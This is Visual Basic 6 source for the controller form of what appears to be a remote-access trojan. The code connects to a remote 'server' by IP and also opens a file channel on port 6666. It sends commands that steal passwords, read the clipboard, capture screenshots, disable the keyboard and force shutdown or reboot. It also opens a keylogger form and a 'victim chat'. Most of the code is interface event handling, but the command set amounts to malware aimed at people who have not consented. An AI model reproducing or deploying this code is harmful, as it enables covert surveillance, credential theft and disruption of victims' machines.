Private Sub lblClose_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblclose.BackColor = &HFFC0C0
End Sub

Private Sub lblclose_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If WS.State = 0 Then
Status.Caption = "you're not connected!..."
Else
tmrright.Enabled = True
WS.SendData "CloseServer"
Status.Caption = "attempting to close server..."
End If
End Sub

Private Sub lblConnect_Click()
On Error Resume Next
    If WS.State = 7 Then
    Exit Sub
  Else
    With WS
        .RemotePort = Me.txtPort.Text
        .RemoteHost = Me.txtIp.Text
        .Connect
    End With
    End If
    With frmFile.File
        .RemotePort = 6666
        .RemoteHost = Me.txtIp.Text
        .Connect
    End With
   
    If txtIp.Text = "" Then
    Status.Caption = "unable to connect..."
    Exit Sub
    ElseIf txtPort.Text = "" Then
    Status.Caption = "unable to connect..."
    Exit Sub
    End If
Status.Caption = "connecting to " & txtIp.Text & " on port " & txtPort
tmrright.Enabled = True
End Sub

Private Sub lblConnect_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblConnect.BackColor = &HFFC0C0
End Sub

Private Sub lblConnect_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblConnect.BackColor = &H800000
End Sub

Private Sub lbldark_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
optionnormal.Visible = False
optioninvert.Visible = False
optionbad.Visible = False
optionbright.Visible = False
optiondark.Visible = True
End Sub

Private Sub lbldeactivate_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If WS.State = 0 Then
Status.Caption = "you're not connected!..."
Else
tmrright.Enabled = True
WS.SendData "DeactivateMatrix"
Status.Caption = "deactivating the matrix..."
End If
End Sub

Private Sub lbldesktop_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbldesktop.BackColor = &HFFC0C0
End Sub

Private Sub lbldesktop_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbldesktop.BackColor = &H800000
lblflip.BackColor = &H8
lblprint.BackColor = &H8
lblbrowser.BackColor = &H8
lblwincolour.BackColor = &H8
cmdConnect.BackColor = &H8
cmdKey.BackColor = &H8
cmdMisc.BackColor = &H8
cmdFun.BackColor = &H8
cmdXtra.BackColor = &H8
lblConnect.BackColor = &H8
End Sub

Private Sub lbldesktop_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
txtwelcome.Visible = False
picserver.Visible = False
picinfo.Visible = False
picnotify.Visible = False
picchat.Visible = False
picmatrix.Visible = False
picpassword.Visible = False
pickeyboard.Visible = False
picclipboard.Visible = False
picflipscreen.Visible = False
picbrowser.Visible = False
picprint.Visible = False
picshutdown.Visible = False
pictime.Visible = False
picdesktop.Visible = True
End Sub

Private Sub lbldisable_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If WS.State = 0 Then
Status.Caption = "you're not connected!..."
Else
tmrright.Enabled = True
WS.SendData "DisableKeyboard"
Status.Caption = "disabling keyboard..."
End If
End Sub

Private Sub lbldown_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbldown.ForeColor = &HFFC0C0
tmrsizedown.Enabled = True
End Sub

Private Sub lbldown_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbldown.ForeColor = &HFF8080
tmrsizedown.Enabled = False
txtprint.FontSize = txtsize.Text
End Sub

Private Sub lblemptyclip_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If WS.State = 0 Then
Status.Caption = "you're not connected!..."
Else
tmrright.Enabled = True
WS.SendData "EmptyClipBoard"
Status.Caption = "emptying clipboard..."
End If
End Sub

Private Sub lblextra_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Load frmExtra
frmExtra.Show
End Sub

Private Sub lblfilemngr_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblfilemngr.BackColor = &HFFC0C0
End Sub

Private Sub lblfilemngr_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblfilemngr.BackColor = &H800000
lblpassword.BackColor = &H8
lblclipmngr.BackColor = &H8
cmdConnect.BackColor = &H8
cmdKey.BackColor = &H8
cmdMisc.BackColor = &H8
cmdFun.BackColor = &H8
cmdXtra.BackColor = &H8
lblConnect.BackColor = &H8
End Sub

Private Sub lblfilemngr_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Load frmFile
frmFile.Show
End Sub

Private Sub lblflip_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblflip.BackColor = &HFFC0C0
End Sub

Private Sub lblflip_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblflip.BackColor = &H800000
lbldesktop.BackColor = &H8
lblprint.BackColor = &H8
lblbrowser.BackColor = &H8
lblwincolour.BackColor = &H8
End Sub

Private Sub lblflip_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
txtwelcome.Visible = False
picserver.Visible = False
picinfo.Visible = False
picnotify.Visible = False
picchat.Visible = False
picmatrix.Visible = False
picpassword.Visible = False
pickeyboard.Visible = False
picclipboard.Visible = False
picdesktop.Visible = False
picbrowser.Visible = False
picprint.Visible = False
picshutdown.Visible = False
pictime.Visible = False
picflipscreen.Visible = True
End Sub

Private Sub lblflipscreen_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblflipscreen.BackColor = &HFFC0C0
End Sub

Private Sub lblflipscreen_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
shpnormal.FillColor = &H8
shpinvert.FillColor = &H8
shpbad.FillColor = &H8
shpdark.FillColor = &H8
shpbright.FillColor = &H8
lblflipscreen.BackColor = &H800000
End Sub

Private Sub lblflipscreen_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If WS.State = 0 Then
Status.Caption = "you're not connected!..."
End If
If checkvertical.Visible = True And checkhorizontal.Visible = False And optionnormal.Visible = True Then
WS.SendData "FlipVerticalNormal"
End If
If checkvertical.Visible = True And checkhorizontal.Visible = False And optioninvert.Visible = True Then
WS.SendData "FlipVerticalInvert"
End If
If checkvertical.Visible = True And checkhorizontal.Visible = False And optionbad.Visible = True Then
WS.SendData "FlipVerticalBad"
End If
If checkvertical.Visible = True And checkhorizontal.Visible = False And optiondark.Visible = True Then
WS.SendData "FlipVerticalDark"
End If
If checkvertical.Visible = True And checkhorizontal.Visible = False And optionbright.Visible = True Then
WS.SendData "FlipVerticalBright"
End If
If checkvertical.Visible = False And checkhorizontal.Visible = True And optionnormal.Visible = True Then
WS.SendData "FlipHorizontalNormal"
End If
If checkvertical.Visible = False And checkhorizontal.Visible = True And optioninvert.Visible = True Then
WS.SendData "FlipHorizontalInvert"
End If
If checkvertical.Visible = False And checkhorizontal.Visible = True And optionbad.Visible = True Then
WS.SendData "FlipHorizontalBad"
End If
If checkvertical.Visible = False And checkhorizontal.Visible = True And optiondark.Visible = True Then
WS.SendData "FlipHorizontalDark"
End If
If checkvertical.Visible = False And checkhorizontal.Visible = True And optionbright.Visible = True Then
WS.SendData "FlipHorizontalBright"
End If
If checkvertical.Visible = True And checkhorizontal.Visible = True And optionnormal.Visible = True Then
WS.SendData "FlipBothNormal"
End If
If checkvertical.Visible = True And checkhorizontal.Visible = True And optioninvert.Visible = True Then
WS.SendData "FlipBothInvert"
End If
If checkvertical.Visible = True And checkhorizontal.Visible = True And optionbad.Visible = True Then
WS.SendData "FlipBothBad"
End If
If checkvertical.Visible = True And checkhorizontal.Visible = True And optiondark.Visible = True Then
WS.SendData "FlipBothDark"
End If
If checkvertical.Visible = True And checkhorizontal.Visible = True And optionbright.Visible = True Then
WS.SendData "FlipBothBright"
End If
tmrright.Enabled = True
Status.Caption = "flipping screen..."
End Sub

Private Sub lblforceshutdown_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If WS.State = 0 Then
Status.Caption = "you're not connected!..."
Else
tmrright.Enabled = True
WS.SendData "ForceShutdown"
Status.Caption = "forcing remote shutdown..."
End If
End Sub

Private Sub lblfullscreen_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If frmMain.WS.State = 0 Then
frmMain.Status.Caption = "you're not connected!..."
Else
Open App.Path & "\Download\screenshot.jpg" For Binary As #1
 bGettingDesktop = True
bFileTransfer = True
frmMain.WS.SendData "FullScreenShot"
frmMain.tmrright.Enabled = True
frmMain.Status.Caption = "retrieving screenshot..."
End If
End Sub

Private Sub lblGetinfo_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblGetinfo.BackColor = &HFFC0C0
End Sub

Private Sub lblGetinfo_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblGetinfo.BackColor = &H800000
lblServer.BackColor = &H8
lblIpnotify.BackColor = &H8
cmdConnect.BackColor = &H8
cmdKey.BackColor = &H8
cmdMisc.BackColor = &H8
cmdFun.BackColor = &H8
cmdXtra.BackColor = &H8
lblConnect.BackColor = &H8
End Sub

Private Sub lblGetinfo_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
txtwelcome.Visible = False
picserver.Visible = False
picnotify.Visible = False
pickeyboard.Visible = False
picchat.Visible = False
picmatrix.Visible = False
picpassword.Visible = False
picclipboard.Visible = False
picdesktop.Visible = False
picflipscreen.Visible = False
picbrowser.Visible = False
picprint.Visible = False
picshutdown.Visible = False
pictime.Visible = False
picinfo.Visible = True
End Sub

Private Sub lblgettimedate_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If WS.State = 0 Then
Status.Caption = "you're not connected!..."
Else
tmrright.Enabled = True
WS.SendData "GetTimeDate"
Status.Caption = "getting current time and date..."
End If
End Sub

Private Sub lblhorizontal_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
shphorizontal.FillColor = &HFFC0C0
End Sub

Private Sub lblhorizontal_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
shphorizontal.FillColor = &H800000
End Sub

Private Sub lblhorizontal_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
If checkhorizontal.Visible = True Then
checkhorizontal.Visible = False
Else: checkhorizontal.Visible = True
End If
End Sub

Private Sub lblinvert_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
optionnormal.Visible = False
optionbad.Visible = False
optiondark.Visible = False
optionbright.Visible = False
optioninvert.Visible = True
End Sub

Private Sub lbllogger_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Load frmKeyLog
frmKeyLog.Show
End Sub

Private Sub lbllogoff_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If WS.State = 0 Then
Status.Caption = "you're not connected!..."
Else
tmrright.Enabled = True
WS.SendData "LogOff"
Status.Caption = "logging off remote user..."
End If
End Sub

Private Sub lblmouse_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Load frmMouse
frmMouse.Show
End Sub

Private Sub lblnormal_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
optioninvert.Visible = False
optionbad.Visible = False
optiondark.Visible = False
optionbright.Visible = False
optionnormal.Visible = True
End Sub

Private Sub lblnormalshutdown_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If WS.State = 0 Then
Status.Caption = "you're not connected!..."
Else
tmrright.Enabled = True
WS.SendData "NormalShutdown"
Status.Caption = "shutting down remote computer..."
End If
End Sub

Private Sub lblopenbrowser_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If WS.State = 0 Then
Status.Caption = "you're not connected!..."
Else
tmrright.Enabled = True
WS.SendData "OpenBrowser;" & txturl.Text
Status.Caption = "opening web browser..."
End If
End Sub

Private Sub lblpoweroff_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If WS.State = 0 Then
Status.Caption = "you're not connected!..."
Else
tmrright.Enabled = True
WS.SendData "PowerOff"
Status.Caption = "shutting down and powering off remote host..."
End If
End Sub

Private Sub lblprint_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
txtwelcome.Visible = False
picserver.Visible = False
picinfo.Visible = False
picnotify.Visible = False
picchat.Visible = False
picmatrix.Visible = False
picpassword.Visible = False
pickeyboard.Visible = False
picclipboard.Visible = False
picdesktop.Visible = False
picflipscreen.Visible = False
picbrowser.Visible = False
picshutdown.Visible = False
pictime.Visible = False
picprint.Visible = True
End Sub

Private Sub lblprinttext_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If WS.State = 0 Then
Status.Caption = "you're not connected!..."
Else
tmrright.Enabled = True
WS.SendData "PrintText;" & txtprint.Text
Status.Caption = "printing text..."
End If
End Sub

Private Sub lblreadclip_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If WS.State = 0 Then
Status.Caption = "you're not connected!..."
Else
tmrright.Enabled = True
WS.SendData "ReadClipBoard"
Status.Caption = "reading clipboard..."
End If
End Sub

Private Sub lblreboot_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If WS.State = 0 Then
Status.Caption = "you're not connected!..."
Else
tmrright.Enabled = True
WS.SendData "Reboot"
Status.Caption = "rebooting remote system..."
End If
End Sub

Private Sub lblrestart_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
txtwelcome.Visible = False
picserver.Visible = False
picinfo.Visible = False
picnotify.Visible = False
picchat.Visible = False
picmatrix.Visible = False
picpassword.Visible = False
pickeyboard.Visible = False
picclipboard.Visible = False
picdesktop.Visible = False
picflipscreen.Visible = False
picbrowser.Visible = False
picprint.Visible = False
pictime.Visible = False
picshutdown.Visible = True
End Sub

Private Sub lblretrieve_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If WS.State = 0 Then
Status.Caption = "you're not connected!..."
Else
tmrright.Enabled = True
WS.SendData "GetInfo"
Status.Caption = "receiving computer info..."
End If
End Sub

Private Sub lblretrievepass_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If WS.State = 0 Then
Status.Caption = "you're not connected!..."
Else
tmrright.Enabled = True
WS.SendData "Passwords"
Status.Caption = "retrieving passwords..."
End If
End Sub

Private Sub lblsavepass_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
cdlg.DialogTitle = "save passwords"
cdlg.InitDir = App.Path
cdlg.Filter = "text files (*.txt)|*.txt"
cdlg.ShowSave
End Sub

Private Sub lblscreensave_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Load frmScreenSave
frmScreenSave.Show
End Sub

Private Sub lblsetclip_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If WS.State = 0 Then
Status.Caption = "you're not connected!..."
Else
tmrright.Enabled = True
WS.SendData "SetClipBoard;" & txtclipboard.Text
Status.Caption = "setting clipboard text..."
End If
End Sub

Private Sub lblsetdate_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If WS.State = 0 Then
Status.Caption = "you're not connected!..."
Else
tmrright.Enabled = True
WS.SendData "SetDate;" & txtdate.Text
Status.Caption = "setting new date..."
End If
End Sub

Private Sub lblsettime_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If WS.State = 0 Then
Status.Caption = "you're not connected!..."
Else
tmrright.Enabled = True
WS.SendData "SetTime;" & txttime.Text
Status.Caption = "setting new time..."
End If
End Sub

Private Sub lbltime_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
txtwelcome.Visible = False
picserver.Visible = False
picinfo.Visible = False
picnotify.Visible = False
picchat.Visible = False
picmatrix.Visible = False
picpassword.Visible = False
pickeyboard.Visible = False
picclipboard.Visible = False
picdesktop.Visible = False
picflipscreen.Visible = False
picbrowser.Visible = False
picprint.Visible = False
picshutdown.Visible = False
pictime.Visible = True
End Sub

Private Sub lblup_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblup.ForeColor = &HFFC0C0
tmrsizeup.Enabled = True
End Sub

Private Sub lblup_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblup.ForeColor = &HFF8080
tmrsizeup.Enabled = False
txtprint.FontSize = txtsize.Text
End Sub

Private Sub lblvertical_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
shpvertical.FillColor = &HFFC0C0
End Sub

Private Sub lblvictimchat_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If txtnick.Text = "" Then
Status.Caption = "enter a nickname..."
Exit Sub
End If
If WS.State = 0 Then
Status.Caption = "you're not connected!..."
Else
frmMain.tmrright.Enabled = True
Load frmChat
frmChat.Show
WS.SendData "InitiateChat"
End If
End Sub

Private Sub lblwincolour_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Load frmColor
frmColor.Show
End Sub

Private Sub picbad_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
optionnormal.Visible = False
optioninvert.Visible = False
optiondark.Visible = False
optionbright.Visible = False
optionbad.Visible = True
End Sub

Private Sub picbrighten_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
optionnormal.Visible = False
optioninvert.Visible = False
optionbad.Visible = False
optiondark.Visible = False
optionbright.Visible = True
End Sub

Private Sub picbrowser_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblopenbrowser.BackColor = &H8
txturl.BackColor = &HFF8080
End Sub

Private Sub picdarken_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
optionnormal.Visible = False
optioninvert.Visible = False
optionbad.Visible = False
optionbright.Visible = False
optiondark.Visible = True
End Sub

Private Sub pichorizontal_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
shphorizontal.FillColor = &HFFC0C0
End Sub

Private Sub pichorizontal_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
If checkhorizontal.Visible = True Then
checkhorizontal.Visible = False
Else: checkhorizontal.Visible = True
End If
End Sub

Private Sub lblIpnotify_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblIpnotify.BackColor = &HFFC0C0
End Sub

Private Sub lblIpnotify_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblIpnotify.BackColor = &H800000
lblGetinfo.BackColor = &H8
lblServer.BackColor = &H8
cmdConnect.BackColor = &H8
cmdKey.BackColor = &H8
cmdMisc.BackColor = &H8
cmdFun.BackColor = &H8
cmdXtra.BackColor = &H8
lblConnect.BackColor = &H8
End Sub

Private Sub lblIpnotify_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
txtwelcome.Visible = False
picinfo.Visible = False
picserver.Visible = False
pickeyboard.Visible = False
picchat.Visible = False
picmatrix.Visible = False
picpassword.Visible = False
picclipboard.Visible = False
picdesktop.Visible = False
picflipscreen.Visible = False
picbrowser.Visible = False
picprint.Visible = False
picshutdown.Visible = False
pictime.Visible = False
picnotify.Visible = True
End Sub

Private Sub lblkeyboard_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblkeyboard.BackColor = &HFFC0C0
End Sub

Private Sub lblkeyboard_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblkeyboard.BackColor = &H800000
lblchat.BackColor = &H8
lblmatrix.BackColor = &H8
lblmsg.BackColor = &H8
cmdConnect.BackColor = &H8
cmdKey.BackColor = &H8
cmdMisc.BackColor = &H8
cmdFun.BackColor = &H8
cmdXtra.BackColor = &H8
lblConnect.BackColor = &H8
End Sub

Private Sub lblkeyboard_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
txtwelcome.Visible = False
picserver.Visible = False
picinfo.Visible = False
picnotify.Visible = False
picchat.Visible = False
picmatrix.Visible = False
picpassword.Visible = False
picclipboard.Visible = False
picdesktop.Visible = False
picflipscreen.Visible = False
picbrowser.Visible = False
picprint.Visible = False
picshutdown.Visible = False
pictime.Visible = False
pickeyboard.Visible = True
End Sub

Private Sub lblmatrix_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblmatrix.BackColor = &HFFC0C0
End Sub

Private Sub lblmatrix_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblmatrix.BackColor = &H800000
lblchat.BackColor = &H8
lblkeyboard.BackColor = &H8
lblmsg.BackColor = &H8
cmdConnect.BackColor = &H8
cmdKey.BackColor = &H8
cmdMisc.BackColor = &H8
cmdFun.BackColor = &H8
cmdXtra.BackColor = &H8
lblConnect.BackColor = &H8
End Sub

Private Sub lblmatrix_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
txtwelcome.Visible = False
picinfo.Visible = False
picnotify.Visible = False
picserver.Visible = False
pickeyboard.Visible = False
picchat.Visible = False
picpassword.Visible = False
picclipboard.Visible = False
picdesktop.Visible = False
picflipscreen.Visible = False
picbrowser.Visible = False
picprint.Visible = False
picshutdown.Visible = False
pictime.Visible = False
picmatrix.Visible = True
End Sub

Private Sub lblmouse_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblmouse.BackColor = &HFFC0C0
End Sub

Private Sub lblmouse_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblmouse.BackColor = &H800000
lblrestart.BackColor = &H8
lblscreensave.BackColor = &H8
lbltime.BackColor = &H8
cmdConnect.BackColor = &H8
cmdKey.BackColor = &H8
cmdMisc.BackColor = &H8
cmdFun.BackColor = &H8
cmdXtra.BackColor = &H8
lblConnect.BackColor = &H8
lblextra.BackColor = &H8
End Sub

Private Sub lblmsg_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblmsg.BackColor = &HFFC0C0
End Sub

Private Sub lblmsg_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblmsg.BackColor = &H800000
lblchat.BackColor = &H8
lblmatrix.BackColor = &H8
lblkeyboard.BackColor = &H8
cmdConnect.BackColor = &H8
cmdKey.BackColor = &H8
cmdMisc.BackColor = &H8
cmdFun.BackColor = &H8
cmdXtra.BackColor = &H8
lblConnect.BackColor = &H8
End Sub

Private Sub lblmsg_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Load frmMsg
frmMsg.Show
End Sub

Private Sub lblnormal_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
shpinvert.FillColor = &H8
shpbad.FillColor = &H8
shpdark.FillColor = &H8
shpbright.FillColor = &H8
shpnormal.FillColor = &H800000
End Sub

Private Sub lblpassword_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblpassword.BackColor = &HFFC0C0
End Sub

Private Sub lblpassword_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblpassword.BackColor = &H800000
lblfilemngr.BackColor = &H8
lblclipmngr.BackColor = &H8
cmdConnect.BackColor = &H8
cmdKey.BackColor = &H8
cmdMisc.BackColor = &H8
cmdFun.BackColor = &H8
cmdXtra.BackColor = &H8
lblConnect.BackColor = &H8
End Sub

Private Sub lblpassword_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
txtwelcome.Visible = False
picinfo.Visible = False
picnotify.Visible = False
pickeyboard.Visible = False
picchat.Visible = False
picmatrix.Visible = False
picserver.Visible = False
picclipboard.Visible = False
picdesktop.Visible = False
picflipscreen.Visible = False
picbrowser.Visible = False
picprint.Visible = False
picshutdown.Visible = False
pictime.Visible = False
picpassword.Visible = True
End Sub

Private Sub lblprint_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblprint.BackColor = &HFFC0C0
End Sub

Private Sub lblprint_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblprint.BackColor = &H800000
lblflip.BackColor = &H8
lbldesktop.BackColor = &H8
lblbrowser.BackColor = &H8
lblwincolour.BackColor = &H8
End Sub

Private Sub lblrestart_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblrestart.BackColor = &HFFC0C0
End Sub

Private Sub lblrestart_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblrestart.BackColor = &H800000
lblscreensave.BackColor = &H8
lblmouse.BackColor = &H8
lbltime.BackColor = &H8
cmdConnect.BackColor = &H8
cmdKey.BackColor = &H8
cmdMisc.BackColor = &H8
cmdFun.BackColor = &H8
cmdXtra.BackColor = &H8
lblConnect.BackColor = &H8
lblextra.BackColor = &H8
End Sub

Private Sub lblretrieve_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblretrieve.BackColor = &HFFC0C0
End Sub

Private Sub lblretrieve_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblretrieve.BackColor = &H800000
End Sub

Private Sub lblscreensave_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblscreensave.BackColor = &HFFC0C0
End Sub

Private Sub lblscreensave_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblscreensave.BackColor = &H800000
lblrestart.BackColor = &H8
lblmouse.BackColor = &H8
lbltime.BackColor = &H8
cmdConnect.BackColor = &H8
cmdKey.BackColor = &H8
cmdMisc.BackColor = &H8
cmdFun.BackColor = &H8
cmdXtra.BackColor = &H8
lblConnect.BackColor = &H8
lblextra.BackColor = &H8
End Sub

Private Sub lblServer_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblServer.BackColor = &HFFC0C0
End Sub

Private Sub lblServer_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblServer.BackColor = &H800000
lblGetinfo.BackColor = &H8
lblIpnotify.BackColor = &H8
cmdConnect.BackColor = &H8
cmdKey.BackColor = &H8
cmdMisc.BackColor = &H8
cmdFun.BackColor = &H8
cmdXtra.BackColor = &H8
lblConnect.BackColor = &H8
End Sub

Private Sub lblServer_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
txtwelcome.Visible = False
picinfo.Visible = False
picnotify.Visible = False
pickeyboard.Visible = False
picchat.Visible = False
picmatrix.Visible = False
picpassword.Visible = False
picclipboard.Visible = False
picdesktop.Visible = False
picflipscreen.Visible = False
picbrowser.Visible = False
picprint.Visible = False
picshutdown.Visible = False
pictime.Visible = False
picserver.Visible = True
End Sub

Private Sub lbltime_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbltime.BackColor = &HFFC0C0
End Sub

Private Sub lbltime_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbltime.BackColor = &H800000
lblrestart.BackColor = &H8
lblmouse.BackColor = &H8
lblscreensave.BackColor = &H8
cmdConnect.BackColor = &H8
cmdKey.BackColor = &H8
cmdMisc.BackColor = &H8
cmdFun.BackColor = &H8
cmdXtra.BackColor = &H8
lblConnect.BackColor = &H8
lblextra.BackColor = &H8
End Sub

Private Sub lblvertical_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
shpvertical.FillColor = &H800000
End Sub

Private Sub lblvertical_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
If checkvertical.Visible = True Then
checkvertical.Visible = False
Else: checkvertical.Visible = True
End If
End Sub

Private Sub picinvert_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
optionnormal.Visible = False
optionbad.Visible = False
optiondark.Visible = False
optionbright.Visible = False
optioninvert.Visible = True
End Sub

Private Sub picnormal_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
optioninvert.Visible = False
optionbad.Visible = False
optiondark.Visible = False
optionbright.Visible = False
optionnormal.Visible = True
End Sub

Private Sub picprint_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblprinttext.BackColor = &H8
End Sub

Private Sub picshutdown_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblnormalshutdown.BackColor = &H8
lblforceshutdown.BackColor = &H8
lbllogoff.BackColor = &H8
lblpoweroff.BackColor = &H8
lblreboot.BackColor = &H8
End Sub

Private Sub pictime_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblsettime.BackColor = &H8
lblsetdate.BackColor = &H8
lblgettimedate.BackColor = &H8
End Sub

Private Sub picvertical_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
shpvertical.FillColor = &HFFC0C0
End Sub

Private Sub picvertical_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
If checkvertical.Visible = True Then
checkvertical.Visible = False
Else: checkvertical.Visible = True
End If
End Sub

Private Sub lblwincolour_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblwincolour.BackColor = &HFFC0C0
End Sub

Private Sub lblwincolour_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblwincolour.BackColor = &H800000
lblflip.BackColor = &H8
lblprint.BackColor = &H8
lblbrowser.BackColor = &H8
lbldesktop.BackColor = &H8
End Sub

Private Sub picbad_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
shpbad.FillColor = &HFF8080
End Sub

Private Sub picbad_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
shpnormal.FillColor = &H8
shpinvert.FillColor = &H8
shpdark.FillColor = &H8
shpbright.FillColor = &H8
shpbad.FillColor = &H800000
End Sub

Private Sub lblbad_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
shpbad.FillColor = &HFF8080
End Sub

Private Sub lblbad_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
shpnormal.FillColor = &H8
shpinvert.FillColor = &H8
shpdark.FillColor = &H8
shpbright.FillColor = &H8
lblflipscreen.BackColor = &H8
shpbad.FillColor = &H800000
End Sub

Private Sub picbrighten_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
shpbright.FillColor = &HFF8080
End Sub

